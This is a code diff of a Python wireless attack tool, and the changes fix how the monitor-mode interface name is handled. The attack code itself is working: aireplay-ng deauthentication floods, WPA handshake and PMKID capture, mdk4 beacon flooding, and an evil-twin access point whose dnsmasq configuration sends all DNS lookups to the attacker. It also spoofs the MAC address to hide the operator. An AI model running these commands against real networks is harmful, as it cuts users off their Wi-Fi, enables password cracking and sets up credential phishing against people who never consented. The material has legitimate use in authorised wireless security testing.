@@ -194,7 +194,7 @@ def check_deps():
         get_colours(f"\nDnsmasq\t\t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
         get_colours("\nInstalling [Dnsmasq]....", "cyan")
         install_dnsmasq = subprocess.run(["sudo", "apt", "install", "dnsmasq", "-y"], capture_output=True,
-                                            text=True)
+                                         text=True)
         if "Setting up dnsmasq" in install_dnsmasq.stdout:
             get_colours("\n[*] Dnsmasq Installed...", "blue")
         else:
@@ -210,7 +210,7 @@ def check_deps():
     else:
         get_colours(f"\nHostapd\t\t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
         get_colours("\nInstalling [Hostapd]....", "cyan")
-        install_hostapd= subprocess.run(["sudo", "apt", "install", "hostapd", "-y"], capture_output=True,
+        install_hostapd = subprocess.run(["sudo", "apt", "install", "hostapd", "-y"], capture_output=True,
                                          text=True)
         if "Setting up hostapd" in install_hostapd.stdout:
             get_colours("\n[*] Dnsmasq Installed...", "blue")
@@ -235,18 +235,29 @@ def attack_func(network_interface, attack_mode):
     subprocess.run(["sudo", "airmon-ng", "start", network_interface], stdout=subprocess.DEVNULL)
     get_colours("\n[!] Generating new Mac Address...", "cyan")
     time.sleep(3)
-    subprocess.run(["sudo", "ifconfig", network_interface + "mon", "down"], stdout=subprocess.DEVNULL)
-    subprocess.run(["sudo", "macchanger", "-r", network_interface + "mon"], stdout=subprocess.DEVNULL)
-    subprocess.run(["sudo", "ifconfig", network_interface + "mon", "up"], stdout=subprocess.DEVNULL)
+
+    try:
+        check_adap = subprocess.run(["sudo", "ifconfig", network_interface + "mon", "down"], capture_output=True,
+                                    text=True)
+        if "No such device" in check_adap.stderr:
+            network_interface = network_interface
+        else:
+            network_interface = network_interface + 'mon'
+    except:
+        pass
+    subprocess.run(["sudo", "ifconfig", network_interface, "down"], stdout=subprocess.DEVNULL)
+    subprocess.run(["sudo", "macchanger", "-r", network_interface], stdout=subprocess.DEVNULL)
+    subprocess.run(["sudo", "ifconfig", network_interface, "up"], stdout=subprocess.DEVNULL)
 
     get_colours("\n[*] New Mac Address Generated ", "blue")
     time.sleep(1)
     subprocess.run(["clear"])
+
     # HandShake Attack Mode
     if attack_mode == "Handshake":
         script_banner()
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
-        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
+        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
         # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
         access_name = input(Fore.YELLOW + "Access point name: ")
         access_channel = input(Fore.YELLOW + "Channel number: ")
@@ -260,9 +271,9 @@ def attack_func(network_interface, attack_mode):
         set_path = f'{get_current_path.decode()}/Capture'
         get_colours("\n[*] Waiting for the Handshake", 'cyan')
         os.system(
-            f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface}mon &")
+            f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface} &")
         time.sleep(5)
-        os.system(f"xterm -hold -e aireplay-ng -0 40 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
+        os.system(f"xterm -hold -e aireplay-ng -0 40 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface} &")
         time.sleep(2)
         subprocess.run(["clear"])
         script_banner()
@@ -305,7 +316,7 @@ def attack_func(network_interface, attack_mode):
         get_colours(f"\n[*] Time Left: \t\t{Fore.YELLOW + str(150)} Seconds", 'blue')
         get_colours("", "yellow")
         process = subprocess.Popen(
-            ["sudo", "hcxdumptool", "-i" + network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
+            ["sudo", "hcxdumptool", "-i" + network_interface, "--enable_status=1", "-o", "Capture_PKMID"])
         try:
             process.wait(timeout=150)  # Time for the process
         except subprocess.TimeoutExpired:
@@ -342,7 +353,7 @@ def attack_func(network_interface, attack_mode):
     elif attack_mode == "DAuth":
         script_banner()
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
-        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
+        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
         access_name = input(Fore.YELLOW + "Access point name: ")
         access_channel = input(Fore.YELLOW + "Channel number: ")
         attack_time = input(Fore.YELLOW + "Time for the attack (seconds): ")
@@ -354,9 +365,9 @@ def attack_func(network_interface, attack_mode):
         except subprocess.TimeoutExpired:
             process.kill()
         os.system(
-            f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} {network_interface}mon &")
+            f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} {network_interface} &")
         os.system(
-            f"xterm -hold -e aireplay-ng -0 {int(attack_time) * 200} -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
+            f"xterm -hold -e aireplay-ng -0 {int(attack_time) * 200} -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface} &")
         subprocess.run(["clear"])
         script_banner()
         get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
@@ -392,7 +403,7 @@ def attack_func(network_interface, attack_mode):
         get_colours("\n[!] Don't close the windows otherwise the attack will stop.", 'yellow')
         get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
         os.system(
-            f"xterm -hold -e sudo mdk4 {network_interface}mon b -s 950")
+            f"xterm -hold -e sudo mdk4 {network_interface} b -s 950")
         quit_program()
     # Evil Twin Attack
     elif attack_mode == "ETwin":
@@ -401,10 +412,10 @@ def attack_func(network_interface, attack_mode):
         access_name = input(Fore.YELLOW + "Access point name: ")
         access_channel = input(Fore.YELLOW + "Channel number: ")
         print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Configuring files...'}")
-        set_hostapd = f"""interface={network_interface}mon\ndriver=nl80211\nssid={access_name}\nhw_mode=g\nchannel={access_channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0
+        set_hostapd = f"""interface={network_interface}\ndriver=nl80211\nssid={access_name}\nhw_mode=g\nchannel={access_channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0
         """
         set_dnsmasq = f""" 
-        interface={network_interface}mon\ndhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h\ndhcp-option=3, 192.168.1.1\ndhcp-option=6, 192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1
+        interface={network_interface}\ndhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h\ndhcp-option=3, 192.168.1.1\ndhcp-option=6, 192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1
         \naddress=/#/192.168.1.1 """
         # Saving HOSTAPD config
         hostapd_config = open("wifi_hostapd.conf", "w+")
@@ -417,7 +428,7 @@ def attack_func(network_interface, attack_mode):
         dnsmasq_config.close()
         # Adding routes
         print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Adding routes for the access point...'}")
-        subprocess.run([f"ifconfig {network_interface}mon up 192.168.1.1 netmask 255.255.255.0"], shell=True)
+        subprocess.run([f"ifconfig {network_interface} up 192.168.1.1 netmask 255.255.255.0"], shell=True)
         subprocess.run(["route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1"], shell=True)
         # get PWD
         get_pwd = subprocess.check_output(["pwd"]).decode().strip()
